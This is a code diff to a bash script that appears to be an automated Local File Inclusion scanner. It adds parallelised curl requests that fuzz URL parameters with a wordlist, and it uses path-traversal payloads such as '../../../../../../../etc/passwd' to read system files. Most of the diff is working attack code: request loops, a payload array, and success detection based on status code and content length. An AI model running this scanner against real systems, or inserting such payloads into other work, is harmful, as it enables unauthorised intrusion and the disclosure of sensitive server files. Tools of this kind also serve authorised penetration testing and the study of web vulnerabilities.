@@ -8,6 +8,8 @@ code_blackList=("")
 
 lfi_filename=$(echo $URL | tr '/' ' '  | tr  '?&' ' ' | grep -o '\w*\.php' | tail -n 1)
 lfi_filename_noex=$(echo $URL | tr '/' ' '  | tr  '?&' ' ' | grep -o '\w*\.php' | tail -n 1 | sed 's/.php//g')
+isFuzz=false
+
 
 lfi_attacks=(
     "../../../../../../../etc/passwd"
@@ -65,12 +67,9 @@ function force_to_fail(){
 
 function brute_force_lfi(){
 
-    replace=$1
-
-    echo -e "$URL" | grep FUZZ &>/dev/null
 
     for lfi_path in "${lfi_attacks[@]}"; do
-
+  
         replace_param_url=$(echo -e $URL | sed "s/FUZZ/$replace/g") 2>/dev/null
         complete_url="${replace_param_url}${lfi_path}"
 
@@ -78,6 +77,7 @@ function brute_force_lfi(){
 
         status_code=$( echo -e "$request" | grep 'HTTP/1.1' | tail -n 1 | awk '{print $3}')
         length=$( echo -e "$request" | grep 'Content-Length' | tail -n 1 | awk '{print $3}')
+        
 
         test_request $status_code $length
 
@@ -108,24 +108,76 @@ function no_brute_force_lfi(){
 }
 
 
+## Function to test the specific php filename target as a lfi param (it must be executed after param bruteforce lfi)
+function filename_as_param(){
+
+    replace_param_url=$(echo -e $URL | sed "s/FUZZ/$lfi_filename_noex/g") 2>/dev/null
+
+    max_processes=0
+
+    for lfi_path in "${lfi_attacks[@]}"; do
+
+        if [[ max_processes -ge 50 ]]; then
+            max_processes=0
+            wait
+        fi
+
+        max_processes=$(( $max_processes+1 ))
+        (
+            complete_url="${replace_param_url}${lfi_path}"
+            request="$(curl -v -s -X GET "${complete_url}" 2>&1 )"
+            status_code=$( echo -e "$request" | grep 'HTTP/1.1' | tail -n 1 | awk '{print $3}')
+            length=$( echo -e "$request" | grep 'Content-Length' | tail -n 1 | awk '{print $3}')
+
+            test_request $status_code $length
+
+            if [[ $? -eq 0 ]]; then
+                echo -e "\t[*] LFI in: $complete_url"
+            fi
+        )&
+    done
+}
+
+
+
 force_to_fail
 
 
+echo -e "$URL" | grep 'FUZZ' &>/dev/null
 
+if [[ $? -eq 0 ]];then
+    isFuzz=true
+fi
 
-echo -e "$URL" | grep FUZZ &>/dev/null
+if [[ $isFuzz ]] && [[ -f $WORDLIST ]]; then
 
-if [[ $? -eq 0 ]]; then
+    echo -e "\n[+] Executing brute force LFI\n"
 
-    echo -e "\n[+] Executing brute force lfi\n"
+    filename_as_param
+
+    max_processes=0
 
    ( for FUZZ in $(cat $WORDLIST); do
-        brute_force_lfi $FUZZ
+
+        if [[ $max_processes -ge 20 ]]; then
+            max_processes=0
+            wait
+            sleep 0.5
+        fi
+        max_processes=$(( $max_processes+1 ))
+
+        (brute_force_lfi $FUZZ) &
     done
    ) 2>/dev/null
-else
 
-    echo -e "\n[+] Executing No brute force lfi\n"
+
+elif [[ $isFuzz == true ]] && [[ ! -f $WORDLIST ]];then
+
+    echo "[!] If you use FUZZ you need a wordlists"
+
+elif [[ $isFuzz == false ]];then
+
+    echo -e "\n[+] Executing No brute force LFI\n"
 
     (no_brute_force_lfi) 2>/dev/null
 
